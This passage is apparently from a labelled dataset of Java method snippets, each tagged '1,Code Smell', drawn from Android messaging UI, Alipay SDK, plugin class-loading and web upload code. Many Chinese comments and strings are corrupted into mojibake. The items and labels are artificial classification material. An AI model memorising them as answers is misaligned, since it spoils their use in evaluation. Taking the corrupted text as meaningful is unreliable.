          System.out.println(""matched in visitLiteral"");
          System.out.println(match);
          System.out.println();
        }
        p.add(match);
      }
      return e;
    }
  }
.reduce(new JsonParser().parse(before.toArray(new String[0])).findFirst().orElseThrow(() -> new IllegalArgumentException(""Could not parse as XML"")),new ArrayList<>());
}",1,Code Smell
"public AlipayTradeCloseResponse close(String outTradeNo) throws Exception {
  java.util.Map<String,Object> runtime_=TeaConverter.buildMap(new TeaPair(""connectTimeout"",15000),new TeaPair(""readTimeout"",15000),new TeaPair(""retry"",TeaConverter.buildMap(new TeaPair(""maxAttempts"",0))));
  TeaRequest _lastRequest=null;
  long _now=System.currentTimeMillis();
  int _retryTimes=0;
  while (Tea.allowRetry((java.util.Map<String,Object>)runtime_.get(""retry""),_retryTimes,_now)) {
    if (_retryTimes > 0) {
      int backoffTime=Tea.getBackoffTime(runtime_.get(""backoff""),_retryTimes);
      if (backoffTime > 0) {
        Tea.sleep(backoffTime);
      }
    }
    _retryTimes=_retryTimes + 1;
    try {
      TeaRequest request_=new TeaRequest();
      java.util.Map<String,String> systemParams=TeaConverter.buildMap(new TeaPair(""method"",""alipay.trade.close""),new TeaPair(""app_id"",_getConfig(""appId"")),new TeaPair(""timestamp"",_getTimestamp()),new TeaPair(""format"",""json""),new TeaPair(""version"",""1.0""),new TeaPair(""alipay_sdk"",_getSdkVersion()),new TeaPair(""charset"",""UTF-8""),new TeaPair(""sign_type"",_getConfig(""signType"")),new TeaPair(""app_cert_sn"",_getMerchantCertSN()),new TeaPair(""alipay_root_cert_sn"",_getAlipayRootCertSN()));
      java.util.Map<String,Object> bizParams=TeaConverter.buildMap(new TeaPair(""out_trade_no"",outTradeNo));
      java.util.Map<String,String> textParams=new java.util.HashMap<>();
      request_.protocol=_getConfig(""protocol"");
      request_.method=""POST"";
      request_.pathname=""/gateway.do"";
      request_.headers=TeaConverter.buildMap(new TeaPair(""host"",_getConfig(""gatewayHost"")),new TeaPair(""content-type"",""application/x-www-form-urlencoded;charset=utf-8""));
      request_.query=TeaConverter.merge(String.class,TeaConverter.buildMap(new TeaPair(""sign"",_sign(systemParams,bizParams,textParams,_getConfig(""merchantPrivateKey"")))),systemParams,textParams);
      request_.body=Tea.toReadable(_toUrlEncodedRequestBody(bizParams));
      _lastRequest=request_;
      TeaResponse response_=Tea.doAction(request_,runtime_);
      java.util.Map<String,Object> respMap=_readAsJson(response_,""alipay.trade.close"");
      if (_isCertMode()) {
        if (_verify(respMap,_extractAlipayPublicKey(_getAlipayCertSN(respMap)))) {
          return TeaModel.toModel(_toRespModel(respMap),new AlipayTradeCloseResponse());
        }
      }
 else {
        if (_verify(respMap,_getConfig(""alipayPublicKey""))) {
          return TeaModel.toModel(_toRespModel(respMap),new AlipayTradeCloseResponse());
        }
      }
      throw new TeaException(TeaConverter.buildMap(new TeaPair(""message"",""楠岀澶辫触锛岃妫�鏌ユ敮浠樺疂鍏挜璁剧疆鏄惁姝ｇ‘銆�"")));
    }
 catch (    Exception e) {
      if (Tea.isRetryable(e)) {
        continue;
      }
      throw e;
    }
  }
  throw new TeaUnretryableException(_lastRequest);
}",1,Code Smell
"/** 
 * 澶勭悊鏂囦欢鍦板潃鍓嶇紑
 * @param sourceList
 * @param preFix
 * @param sourceField
 * @throws Exception
 */
public static void handleFileSourcePrefix(List<Object> sourceList,String preFix,String sourceField) throws Exception {
  for (  Object source : sourceList) {
    String firstWord=sourceField.substring(0,1).toUpperCase();
    String getMethodName=String.format(""get%s%s"",firstWord,sourceField.substring(1));
    Method getMethod=source.getClass().getMethod(getMethodName,(new String()).getClass());
    Object fieldValue=getMethod.invoke(source,new Object[]{});
    String setMethodName=String.format(""set%s%s"",firstWord,sourceField.substring(1));
    Method setMethod=source.getClass().getMethod(setMethodName,(new String()).getClass());
    setMethod.invoke(source,preFix + (String)fieldValue);
  }
}
/** 
 * 澶勭悊鏂囦欢鍦板潃鍓嶇紑
 * @param source
 * @param preFix
 * @param sourceField
 * @throws Exception
 */
public static void handleFileSourcePrefix(Object source,String preFix,String sourceField) throws Exception {
  if (StringUtils.isEmpty(preFix)) {
    preFix=""http://file.cfeng.wang/"";
  }
  String firstWord=sourceField.substring(0,1).toUpperCase();
  if (source instanceof HashMap) {
    source=(Map<String,String>)source;
    if (((HashMap<?,?>)source).containsKey(sourceField) && StringUtils.isNotEmpty(((HashMap<?,?>)source).get(sourceField).toString()) && ((HashMap<?,?>)source).get(sourceField).toString().toString().indexOf(""http://"") < 0 && ((HashMap<?,?>)source).get(sourceField).toString().toString().indexOf(""https://"") < 0) {
      ((HashMap<String,String>)source).put(sourceField,preFix + ((HashMap<?,?>)source).get(sourceField).toString());
    }
  }
 else {
    String getMethodName=String.format(""get%s%s"",firstWord,sourceField.substring(1));
    Method getMethod=source.getClass().getMethod(getMethodName);
    Object fieldValue=getMethod.invoke(source,new Object[]{});
    if (fieldValue != null && StringUtils.isNotEmpty(fieldValue.toString()) && fieldValue.toString().indexOf(""http://"") < 0 && fieldValue.toString().indexOf(""https://"") < 0) {
      if (fieldValue.toString().indexOf("","") < 0) {
        String setMethodName=String.format(""set%s%s"",firstWord,sourceField.substring(1));
        Method setMethod=source.getClass().getMethod(setMethodName,(new String()).getClass());
        setMethod.invoke(source,preFix + (String)fieldValue);
      }
 else {
        String[] images=fieldValue.toString().split("","");
        String newString="""";
        for (int i=0; i < images.length; i++) {
          if (StringUtils.isNotEmpty(images[i])) {
            if (i != images.length - 1) {
              newString+=preFix + images[i] + "","";
            }
 else {
              newString+=preFix + images[i];
            }
          }
        }
        String setMethodName=String.format(""set%s%s"",firstWord,sourceField.substring(1));
        Method setMethod=source.getClass().getMethod(setMethodName,(new String()).getClass());
        setMethod.invoke(source,newString);
      }
    }
  }
}",1,Code Smell
"public boolean onTransact(int code,@NonNull Parcel data,@Nullable Parcel reply,int flags){
  data.enforceInterface(DESCRIPTOR);
  int action=data.readInt();
  LOGGER.d(""onTransact: action=%d, callingUid=%d, callingPid=%d"",action,Binder.getCallingUid(),Binder.getCallingPid());
switch (action) {
case ACTION_SEND_BINDER:
{
      if (Binder.getCallingUid() == 0) {
        IBinder binder=data.readStrongBinder();
        long identity=Binder.clearCallingIdentity();
        try {
          sendBinder(binder);
        }
  finally {
          Binder.restoreCallingIdentity(identity);
        }
        if (reply != null) {
          reply.writeNoException();
        }
        return true;
      }
      break;
    }
case ACTION_GET_BINDER:
{
    if (Bridge.isHidden(Binder.getCallingUid())) {
      return false;
    }
    if (reply != null) {
      reply.writeNoException();
      LOGGER.d(""saved binder is %s"",serviceBinder);
      reply.writeStrongBinder(serviceBinder);
    }
    return true;
  }
case ACTION_NOTIFY_FINISHED:
{
  if (Binder.getCallingUid() == 0) {
    serviceStarted=true;
    if (reply != null) {
      reply.writeNoException();
    }
    return true;
  }
}
}
return false;
}",1,Code Smell
"public static void setSerialDataHuaXiaByShowContent(HuaXiaResponse huaXiaResponse,ShowContent showContent,String validityPeriod) throws Exception {
  Map<String,TextPlay> textPlayList=showContent.getTextPlay();
  for (  Map.Entry<String,TextPlay> item : textPlayList.entrySet()) {
    TextPlay textPlay=null;
    if (!(item.getValue() instanceof TextPlay)) {
      textPlay=BeanUtils.deepMapToBean(TextPlay.class.newInstance().getClass(),(Map)item.getValue());
    }
 else {
      textPlay=item.getValue();
    }
    Integer serialChannel=0;
    if (!(textPlay.getSerialChannel() instanceof Integer)) {
      serialChannel=Integer.parseInt(textPlay.getSerialChannel() + """");
    }
    Integer row=1;
    row=Integer.parseInt(item.getKey() + """");
    if (textPlay.getStatus() == 1 && StringUtils.isNotEmpty(textPlay.getValue())) {
      SeriaDataUtils.setSerialDataHuaXia(huaXiaResponse,textPlay.getValue(),serialChannel,row.byteValue(),textPlay.getColor(),textPlay.getInMode(),textPlay.getOutMode(),showContent.getDeviceModel(),""text"","""",validityPeriod);
    }
  }
  Map<Integer,VoicePlay> voicePlayList=showContent.getVoicePlay();
  for (  Map.Entry<Integer,VoicePlay> item : voicePlayList.entrySet()) {
    VoicePlay voicePlay=null;
    if (!(item.getValue() instanceof VoicePlay)) {
      voicePlay=BeanUtils.deepMapToBean(VoicePlay.class.newInstance().getClass(),(Map)item.getValue());
    }
 else {
      voicePlay=item.getValue();
    }
    Integer serialChannel=0;
    if (!(voicePlay.getSerialChannel() instanceof Integer)) {
      serialChannel=Integer.parseInt(voicePlay.getSerialChannel() + """");
    }
    Integer row=1;
    if (!(item.getKey() instanceof Integer)) {
      row=Integer.parseInt(item.getKey() + """");
    }
    if (voicePlay.getStatus() == 1 && StringUtils.isNotEmpty(voicePlay.getValue())) {
      SeriaDataUtils.setSerialDataHuaXia(huaXiaResponse,voicePlay.getValue(),serialChannel,row.byteValue(),"""","""","""",showContent.getDeviceModel(),""voice"",voicePlay.getPlayMode(),validityPeriod);
    }
  }
}",1,Code Smell
"public void reload(){
  try {
    SortConfig newConfig=SortConfigHolder.getSortConfig();
    if (newConfig == null) {
      return;
    }
    for (    SortTaskConfig taskConfig : newConfig.getTasks()) {
      String newTaskName=taskConfig.getSortTaskName();
      if (taskMap.containsKey(newTaskName)) {
        continue;
      }
      SortTask newTask=new SortTask(newTaskName);
      newTask.start();
      this.taskMap.put(newTaskName,newTask);
    }
    deletingTasks.clear();
    for (    Map.Entry<String,SortTask> entry : taskMap.entrySet()) {
      String taskName=entry.getKey();
      boolean isFound=false;
      for (      SortTaskConfig taskConfig : newConfig.getTasks()) {
        if (taskName.equals(taskConfig.getSortTaskName())) {
          isFound=true;
          break;
        }
      }
      if (!isFound) {
        this.deletingTasks.add(entry.getValue());
      }
    }
    for (    SortTask task : deletingTasks) {
      task.stop();
      taskMap.remove(task.getTaskName());
    }
  }
 catch (  Throwable e) {
    log.error(""failed to reload cluster"",e);
  }
}
",1,Code Smell
"/** 
 * @author IzzelAliz
 * @reason
 */
@Overwrite protected Class<?> findClass(String name) throws ClassNotFoundException {
  if (name.startsWith(""org.bukkit."") || name.startsWith(""net.minecraft."")) {
    throw new ClassNotFoundException(name);
  }
  Class<?> result=classes.get(name);
  if (result == null) {
    String path=name.replace('.','/').concat("".class"");
    URL url=this.findResource(path);
    if (url != null) {
      URLConnection connection;
      Callable<byte[]> byteSource;
      try {
        connection=url.openConnection();
        connection.connect();
        byteSource=() -> {
          try (InputStream is=connection.getInputStream()){
            byte[] classBytes=ByteStreams.toByteArray(is);
            classBytes=ArclightRemapper.SWITCH_TABLE_FIXER.apply(classBytes);
            classBytes=Bukkit.getUnsafe().processClass(description,path,classBytes);
            return classBytes;
          }
         }
;
      }
 catch (      IOException e) {
        throw new ClassNotFoundException(name,e);
      }
      Product2<byte[],CodeSource> classBytes=this.getRemapper().remapClass(name,byteSource,connection);
      int dot=name.lastIndexOf('.');
      if (dot != -1) {
        String pkgName=name.substring(0,dot);
        if (getPackage(pkgName) == null) {
          try {
            if (manifest != null) {
              definePackage(pkgName,manifest,this.url);
            }
 else {
              definePackage(pkgName,null,null,null,null,null,null,null);
            }
          }
 catch (          IllegalArgumentException ex) {
            if (getPackage(pkgName) == null) {
              throw new IllegalStateException(""Cannot find package "" + pkgName);
            }
          }
        }
      }
      result=defineClass(name,classBytes._1,0,classBytes._1.length,classBytes._2);
    }
    if (result == null) {
      result=super.findClass(name);
    }
    ((JavaPluginLoaderBridge)(Object)loader).bridge$setClass(name,result);
    classes.put(name,result);
  }
  return result;
}",1,Code Smell
"@Nullable public static PsiFile findMatchedCodeFile(Project project,String name,String pkgName){
  ArrayList<PsiFile> matchFiles=new ArrayList<>();
  final String buildVariant=getCurrentBuildVariant(project);
  PsiFile[] findFiles=FilenameIndex.getFilesByName(project,name + "".java"",new EverythingGlobalScope(project));
  for (  PsiFile f : findFiles) {
    matchFiles.add(f);
  }
  if (matchFiles.size() != 0) {
    final PsiFile selfProjectFile=getSelfProjectFile(buildVariant,matchFiles,pkgName,name);
    if (selfProjectFile != null) {
      return selfProjectFile;
    }
    matchFiles.clear();
  }
  findFiles=FilenameIndex.getFilesByName(project,name + "".kt"",new EverythingGlobalScope(project));
  for (  PsiFile f : findFiles) {
    if (f.getViewProvider().getVirtualFile().getPresentableUrl().replace(File.separator,""."").contains(pkgName)) {
      matchFiles.add(f);
    }
  }
  if (matchFiles.size() != 0) {
    final PsiFile selfProjectFile=getSelfProjectFile(buildVariant,matchFiles,pkgName,name);
    if (selfProjectFile != null) {
      return selfProjectFile;
    }
    matchFiles.clear();
  }
  findFiles=FilenameIndex.getFilesByName(project,name + "".class"",new EverythingGlobalScope(project));
  for (  PsiFile f : findFiles) {
    matchFiles.add(f);
  }
  if (matchFiles.size() != 0) {
    final PsiFile selfProjectFile=getSelfProjectFile(buildVariant,matchFiles,pkgName,name);
    if (selfProjectFile != null) {
      return selfProjectFile;
    }
  }
  return null;
}",1,Code Smell
"public static ArrayList<String> findStickerEmoticons(TLRPC.Document document,Integer currentAccountForFull){
  if (document == null) {
    return null;
  }
  ArrayList<String> emojis=new ArrayList<>();
  for (int a=0, N=document.attributes.size(); a < N; a++) {
    TLRPC.DocumentAttribute attribute=document.attributes.get(a);
    if (attribute instanceof TLRPC.TL_documentAttributeCustomEmoji || attribute instanceof TLRPC.TL_documentAttributeSticker) {
      if (currentAccountForFull != null) {
        TLRPC.TL_messages_stickerSet set=MediaDataController.getInstance(currentAccountForFull).getStickerSet(attribute.stickerset,true);
        if (set != null && set.packs != null) {
          for (int p=0; p < set.packs.size(); ++p) {
            TLRPC.TL_stickerPack pack=set.packs.get(p);
            if (pack.documents.contains(document.id) && Emoji.getEmojiDrawable(pack.emoticon) != null) {
              emojis.add(pack.emoticon);
            }
          }
        }
        if (!emojis.isEmpty()) {
          return emojis;
        }
      }
      if (!TextUtils.isEmpty(attribute.alt) && Emoji.getEmojiDrawable(attribute.alt) != null) {
        emojis.add(attribute.alt);
        return emojis;
      }
    }
  }
  return null;
}",1,Code Smell
"@java.lang.Override public void writeTo(com.google.protobuf.CodedOutputStream output) throws java.io.IOException {
  getSerializedSize();
  if (metadata_ != null) {
    output.writeMessage(1,getMetadata());
  }
  if (getForwardFeatureMappingList().size() > 0) {
    output.writeUInt32NoTag(18);
    output.writeUInt32NoTag(forwardFeatureMappingMemoizedSerializedSize);
  }
  for (int i=0; i < forwardFeatureMapping_.size(); i++) {
    output.writeInt32NoTag(forwardFeatureMapping_.getInt(i));
  }
  if (getBackwardFeatureMappingList().size() > 0) {
    output.writeUInt32NoTag(26);
    output.writeUInt32NoTag(backwardFeatureMappingMemoizedSerializedSize);
  }
  for (int i=0; i < backwardFeatureMapping_.size(); i++) {
    output.writeInt32NoTag(backwardFeatureMapping_.getInt(i));
  }
  if (!modelArray_.isEmpty()) {
    output.writeBytes(4,modelArray_);
  }
  if (!com.google.protobuf.GeneratedMessageV3.isStringEmpty(inputName_)) {
    com.google.protobuf.GeneratedMessageV3.writeString(output,5,inputName_);
  }
  if (outputTransformer_ != null) {
    output.writeMessage(6,getOutputTransformer());
  }
  if (exampleTransformer_ != null) {
    output.writeMessage(7,getExampleTransformer());
  }
  unknownFields.writeTo(output);
}",1,Code Smell
"private void onMeasureInternal(int widthMeasureSpec,int heightMeasureSpec){
  int widthSize=MeasureSpec.getSize(widthMeasureSpec);
  int heightSize=MeasureSpec.getSize(heightMeasureSpec);
  setMeasuredDimension(widthSize,heightSize);
  widthSize-=backgroundPaddingLeft * 2;
  int keyboardSize=0;
  if (!commentTextView.isWaitingForKeyboardOpen() && keyboardSize <= AndroidUtilities.dp(20) && !commentTextView.isPopupShowing() && !commentTextView.isAnimatePopupClosing()) {
    ignoreLayout=true;
    commentTextView.hideEmojiView();
    ignoreLayout=false;
  }
  if (pollLayout != null && keyboardSize <= AndroidUtilities.dp(20) && !pollLayout.isWaitingForKeyboardOpen() && !pollLayout.isPopupShowing() && !pollLayout.isAnimatePopupClosing()) {
    ignoreLayout=true;
    pollLayout.hideEmojiView();
    ignoreLayout=false;
  }
  if (keyboardSize <= AndroidUtilities.dp(20)) {
    int paddingBottom;
    if (keyboardVisible) {
      paddingBottom=0;
    }
 else {
      if (currentAttachLayout == pollLayout && pollLayout.emojiView != null) {
        paddingBottom=pollLayout.getEmojiPadding();
      }
 else {
        paddingBottom=commentTextView.getEmojiPadding();
      }
    }
    if (!AndroidUtilities.isInMultiwindow) {
      heightSize-=paddingBottom;
      heightMeasureSpec=MeasureSpec.makeMeasureSpec(heightSize,MeasureSpec.EXACTLY);
    }
    ignoreLayout=true;
    currentAttachLayout.onPreMeasure(widthSize,heightSize);
    if (nextAttachLayout != null) {
      nextAttachLayout.onPreMeasure(widthSize,heightSize);
    }
    ignoreLayout=false;
  }
  int childCount=getChildCount();
  for (int i=0; i < childCount; i++) {
    View child=getChildAt(i);
    if (child == null || child.getVisibility() == GONE) {
      continue;
    }
    if (commentTextView != null && commentTextView.isPopupView(child) || pollLayout != null && child == pollLayout.emojiView) {
      if (inBubbleMode) {
        child.measure(MeasureSpec.makeMeasureSpec(widthSize,MeasureSpec.EXACTLY),MeasureSpec.makeMeasureSpec(heightSize + getPaddingTop(),MeasureSpec.EXACTLY));
      }
 else       if (AndroidUtilities.isInMultiwindow || AndroidUtilities.isTablet()) {
        if (AndroidUtilities.isTablet()) {
          child.measure(MeasureSpec.makeMeasureSpec(widthSize,MeasureSpec.EXACTLY),MeasureSpec.makeMeasureSpec(Math.min(AndroidUtilities.dp(AndroidUtilities.isTablet() ? 200 : 320),heightSize - AndroidUtilities.statusBarHeight + getPaddingTop()),MeasureSpec.EXACTLY));
        }
 else {
          child.measure(MeasureSpec.makeMeasureSpec(widthSize,MeasureSpec.EXACTLY),MeasureSpec.makeMeasureSpec(heightSize - AndroidUtilities.statusBarHeight + getPaddingTop(),MeasureSpec.EXACTLY));
        }
      }
 else {
        child.measure(MeasureSpec.makeMeasureSpec(widthSize,MeasureSpec.EXACTLY),MeasureSpec.makeMeasureSpec(child.getLayoutParams().height,MeasureSpec.EXACTLY));
      }
    }
 else {
      measureChildWithMargins(child,widthMeasureSpec,0,heightMeasureSpec,0);
    }
  }
}",1,Code Smell
"public void setLocation(TLRPC.TL_messageMediaVenue location,int pos,boolean divider){
  setLocation(location,null,pos,divider,false);
}
public void setLocation(TLRPC.TL_messageMediaVenue location,String label,int pos,boolean divider,boolean animated){
  needDivider=divider;
  if (location != null) {
    nameTextView.setText(getTitle(location),allowTextAnimation && !LocaleController.isRTL && animated);
  }
  if (label != null) {
    addressTextView.setText(label,allowTextAnimation && !LocaleController.isRTL);
  }
 else   if (location != null) {
    addressTextView.setText(location.address,allowTextAnimation && !LocaleController.isRTL && animated);
  }
  int color=getColorForIndex(pos);
  if (location != null && location.icon != null) {
    if (""pin"".equals(location.icon) || location.icon.startsWith(""emoji"")) {
      Drawable drawable=getResources().getDrawable(R.drawable.pin).mutate();
      drawable.setColorFilter(new PorterDuffColorFilter(getThemedColor(Theme.key_location_sendLocationIcon),PorterDuff.Mode.MULTIPLY));
      CombinedDrawable combinedDrawable=new CombinedDrawable(Theme.createCircleDrawable(AndroidUtilities.dp(42),0),drawable);
      combinedDrawable.setCustomSize(AndroidUtilities.dp(42),AndroidUtilities.dp(42));
      combinedDrawable.setIconSize(AndroidUtilities.dp(24),AndroidUtilities.dp(24));
      imageView.setImageDrawable(combinedDrawable);
    }
 else {
      imageView.setImage(location.icon,null,null);
    }
  }
  circleDrawable.getPaint().setColor(color);
  setWillNotDraw(false);
  setClickable(location == null);
  if (enterAnimator != null)   enterAnimator.cancel();
  boolean loading=location == null;
  float fromEnterAlpha=enterAlpha, toEnterAlpha=loading ? 0f : 1f;
  long duration=(long)(Math.abs(fromEnterAlpha - toEnterAlpha) * 150);
  enterAnimator=ValueAnimator.ofFloat(fromEnterAlpha,toEnterAlpha);
  final long start=SystemClock.elapsedRealtime();
  enterAnimator.addUpdateListener(a -> {
    float t=Math.min(Math.max((float)(SystemClock.elapsedRealtime() - start) / duration,0),1);
    if (duration <= 0)     t=1f;
    enterAlpha=AndroidUtilities.lerp(fromEnterAlpha,toEnterAlpha,t);
    imageView.setAlpha(enterAlpha);
    nameTextView.setAlpha(enterAlpha);
    addressTextView.setAlpha(enterAlpha);
    invalidate();
  }
);
  enterAnimator.setDuration(loading ? Long.MAX_VALUE : duration);
  enterAnimator.start();
  imageView.setAlpha(fromEnterAlpha);
  nameTextView.setAlpha(fromEnterAlpha);
  addressTextView.setAlpha(fromEnterAlpha);
  invalidate();
}",1,Code Smell
"private void updateRows(){
  rowCount=0;
  dividerRow=-1;
  chatStartRow=-1;
  chatEndRow=-1;
  loadingRow=-1;
  linkRow=-1;
  emptyViewDividerRow=-1;
  boostFeaturesStartRow=-1;
  headerRow=rowCount++;
  if (type == TYPE_BOOSTS_FOR_USERS || type == TYPE_BOOSTS_FOR_POSTING || type == TYPE_BOOSTS_FOR_COLOR || type == TYPE_BOOSTS_FOR_PROFILE_COLOR || type == TYPE_BOOSTS_FOR_REPLY_ICON || type == TYPE_BOOSTS_FOR_PROFILE_ICON || type == TYPE_BOOSTS_FOR_WALLPAPER || type == TYPE_BOOSTS_FOR_CUSTOM_WALLPAPER || type == TYPE_BOOSTS_FOR_EMOJI_STATUS || type == TYPE_BOOSTS_FOR_CUSTOM_EMOJI_PACK || type == TYPE_BOOSTS_FOR_REACTIONS || type == TYPE_BOOSTS_FOR_ADS) {
    if (type != TYPE_BOOSTS_FOR_USERS || ChatObject.hasAdminRights(getChat())) {
      topPadding=.24f;
      linkRow=rowCount++;
      if (MessagesController.getInstance(currentAccount).giveawayGiftsPurchaseAvailable) {
        bottomRow=rowCount++;
      }
    }
    setupBoostFeatures();
    boostFeaturesStartRow=rowCount++;
    rowCount+=boostFeatures.size() - 1;
  }
 else   if (type == TYPE_FEATURES || type == TYPE_BOOSTS_FOR_REMOVE_RESTRICTIONS) {
    topPadding=.24f;
    setupBoostFeatures();
    chatStartRow=rowCount;
    boostFeaturesStartRow=rowCount++;
    rowCount+=boostFeatures.size() - 1;
    chatEndRow=rowCount;
  }
 else   if (!hasFixedSize(type)) {
    if (type != TYPE_ADD_MEMBERS_RESTRICTED) {
      dividerRow=rowCount++;
      chatsTitleRow=rowCount++;
    }
 else {
      topPadding=.24f;
    }
    if (loading) {
      loadingRow=rowCount++;
    }
 else {
      if (!(type == TYPE_ADD_MEMBERS_RESTRICTED && !MessagesController.getInstance(currentAccount).premiumFeaturesBlocked() && (premiumInviteBlockedUsers != null && !premiumInviteBlockedUsers.isEmpty() || premiumMessagingBlockedUsers != null && premiumMessagingBlockedUsers.size() >= restrictedUsers.size())) || !(premiumInviteBlockedUsers != null && premiumInviteBlockedUsers.size() == 1 && premiumMessagingBlockedUsers != null && premiumMessagingBlockedUsers.size() == 1 && canSendLink)) {
        chatStartRow=rowCount;
        if (type == TYPE_ADD_MEMBERS_RESTRICTED) {
          rowCount+=restrictedUsers.size();
        }
 else         if (type == TYPE_TO0_MANY_COMMUNITIES) {
          rowCount+=inactiveChats.size();
        }
 else {
          rowCount+=chats.size();
        }
        chatEndRow=rowCount;
      }
      if (chatEndRow - chatStartRow > 1) {
        emptyViewDividerRow=rowCount++;
      }
    }
  }
  notifyDataSetChanged();
}",1,Code Smell
"/** 
 * 鍥剧墖涓婁紶
 */
@RequestMapping(value=""/upload/files"",method=RequestMethod.POST) @ApiOperation(value=""澶氬浘涓婁紶"",notes=""wangEditor鍥剧墖涓婁紶"") public Result uploadV2(HttpServletRequest httpServletRequest,@TokenToAdminUser AdminUserToken adminUser) throws URISyntaxException {
  logger.info(""adminUser:{}"",adminUser.toString());
  List<MultipartFile> multipartFiles=new ArrayList<>(8);
  if (standardServletMultipartResolver.isMultipart(httpServletRequest)) {
    MultipartHttpServletRequest multiRequest=(MultipartHttpServletRequest)httpServletRequest;
    Iterator<String> iter=multiRequest.getFileNames();
    int total=0;
    while (iter.hasNext()) {
      if (total > 5) {
        return ResultGenerator.genFailResult(""鏈澶氫笂浼5寮犲浘鐗"");
      }
      total+=1;
      MultipartFile file=multiRequest.getFile(iter.next());
      multipartFiles.add(file);
    }
  }
  if (CollectionUtils.isEmpty(multipartFiles)) {
    return ResultGenerator.genFailResult(""鍙傛暟寮傚父"");
  }
  if (multipartFiles != null && multipartFiles.size() > 5) {
    return ResultGenerator.genFailResult(""鏈澶氫笂浼5寮犲浘鐗"");
  }
  List<String> fileNames=new ArrayList(multipartFiles.size());
  for (int i=0; i < multipartFiles.size(); i++) {
    String fileName=multipartFiles.get(i).getOriginalFilename();
    String suffixName=fileName.substring(fileName.lastIndexOf("".""));
    SimpleDateFormat sdf=new SimpleDateFormat(""yyyyMMdd_HHmmss"");
    Random r=new Random();
    StringBuilder tempName=new StringBuilder();
    tempName.append(sdf.format(new Date())).append(r.nextInt(100)).append(suffixName);
    String newFileName=tempName.toString();
    File fileDirectory=new File(Constants.FILE_UPLOAD_DIC);
    File destFile=new File(Constants.FILE_UPLOAD_DIC + newFileName);
    try {
      if (!fileDirectory.exists()) {
        if (!fileDirectory.mkdir()) {
          throw new IOException(""鏂囦欢澶瑰垱寤哄け璐,璺緞涓猴細"" + fileDirectory);
        }
      }
      multipartFiles.get(i).transferTo(destFile);
      fileNames.add(NewBeeMallUtils.getHost(new URI(httpServletRequest.getRequestURL() + """")) + ""/upload/"" + newFileName);
    }
 catch (    IOException e) {
      e.printStackTrace();
      return ResultGenerator.genFailResult(""鏂囦欢涓婁紶澶辫触"");
    }
  }
  Result resultSuccess=ResultGenerator.genSuccessResult();
  resultSuccess.setData(fileNames);
  return resultSuccess;
}",1,Code Smell
"public static void loadCountries(Utilities.Callback<Pair<Map<String,List<TLRPC.TL_help_country>>,List<String>>> onDone){
  ConnectionsManager connection=ConnectionsManager.getInstance(UserConfig.selectedAccount);
  TLRPC.TL_help_getCountriesList req=new TLRPC.TL_help_getCountriesList();
  req.lang_code=LocaleController.getInstance().getCurrentLocaleInfo() != null ? LocaleController.getInstance().getCurrentLocaleInfo().getLangCode() : Locale.getDefault().getCountry();
  int reqId=connection.sendRequest(req,(response,error) -> {
    if (response != null) {
      TLRPC.TL_help_countriesList help_countriesList=(TLRPC.TL_help_countriesList)response;
      Map<String,List<TLRPC.TL_help_country>> countriesMap=new HashMap<>();
      List<String> sortedLetters=new ArrayList<>();
      for (int i=0; i < help_countriesList.countries.size(); i++) {
        TLRPC.TL_help_country country=help_countriesList.countries.get(i);
        if (country.name != null) {
          country.default_name=country.name;
        }
        if (country.iso2.equalsIgnoreCase(""FT"")) {
          continue;
        }
        String letter=country.default_name.substring(0,1).toUpperCase();
        List<TLRPC.TL_help_country> arr=countriesMap.get(letter);
        if (arr == null) {
          arr=new ArrayList<>();
          countriesMap.put(letter,arr);
          sortedLetters.add(letter);
        }
        arr.add(country);
      }
      Comparator<String> comparator;
      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
        Collator collator=Collator.getInstance(LocaleController.getInstance().getCurrentLocale() != null ? LocaleController.getInstance().getCurrentLocale() : Locale.getDefault());
        comparator=collator::compare;
      }
 else {
        comparator=String::compareTo;
      }
      Collections.sort(sortedLetters,comparator);
      for (      List<TLRPC.TL_help_country> arr : countriesMap.values()) {
        Collections.sort(arr,(country,country2) -> comparator.compare(country.default_name,country2.default_name));
      }
      AndroidUtilities.runOnUIThread(() -> onDone.run(new Pair<>(countriesMap,sortedLetters)));
    }
  }
);
}",1,Code Smell
"public void deleteNotificationChannelGlobalInternal(int type,int what){
  if (Build.VERSION.SDK_INT < 26) {
    return;
  }
  try {
    SharedPreferences preferences=getAccountInstance().getNotificationsSettings();
    SharedPreferences.Editor editor=preferences.edit();
    if (what == 0 || what == -1) {
      String key;
      if (type == TYPE_CHANNEL) {
        key=""channels"";
      }
 else       if (type == TYPE_GROUP) {
        key=""groups"";
      }
 else       if (type == TYPE_STORIES) {
        key=""stories"";
      }
 else       if (type == TYPE_REACTIONS_MESSAGES || type == TYPE_REACTIONS_STORIES) {
        key=""reactions"";
      }
 else {
        key=""private"";
      }
      String channelId=preferences.getString(key,null);
      if (channelId != null) {
        editor.remove(key).remove(key + ""_s"");
        try {
          systemNotificationManager.deleteNotificationChannel(channelId);
        }
 catch (        Exception e) {
          FileLog.e(e);
        }
        if (BuildVars.LOGS_ENABLED) {
          FileLog.d(""delete channel global internal "" + channelId);
        }
      }
    }
    if (what == 1 || what == -1) {
      String key;
      if (type == TYPE_CHANNEL) {
        key=""channels_ia"";
      }
 else       if (type == TYPE_GROUP) {
        key=""groups_ia"";
      }
 else       if (type == TYPE_STORIES) {
        key=""stories_ia"";
      }
 else       if (type == TYPE_REACTIONS_MESSAGES || type == TYPE_REACTIONS_STORIES) {
        key=""reactions_ia"";
      }
 else {
        key=""private_ia"";
      }
      String channelId=preferences.getString(key,null);
      if (channelId != null) {
        editor.remove(key).remove(key + ""_s"");
        try {
          systemNotificationManager.deleteNotificationChannel(channelId);
        }
 catch (        Exception e) {
          FileLog.e(e);
        }
        if (BuildVars.LOGS_ENABLED) {
          FileLog.d(""delete channel global internal "" + channelId);
        }
      }
    }
    String overwriteKey;
    if (type == TYPE_CHANNEL) {
      overwriteKey=""overwrite_channel"";
    }
 else     if (type == TYPE_GROUP) {
      overwriteKey=""overwrite_group"";
    }
 else     if (type == TYPE_STORIES) {
      overwriteKey=""overwrite_stories"";
    }
 else     if (type == TYPE_REACTIONS_MESSAGES || type == TYPE_REACTIONS_STORIES) {
      overwriteKey=""overwrite_reactions"";
    }
 else {
      overwriteKey=""overwrite_private"";
    }
    editor.remove(overwriteKey);
    editor.commit();
  }
 catch (  Exception e) {
    FileLog.e(e);
  }
}",1,Code Smell
"private void populateWithComposedSchema(Map<String,Object> values,String propertyName,Schema<?> composedSchema){
  if (composedSchema.getAllOf() != null) {
    addXXXOfExamples(values,propertyName,composedSchema.getAllOf(),""ALL_OF"");
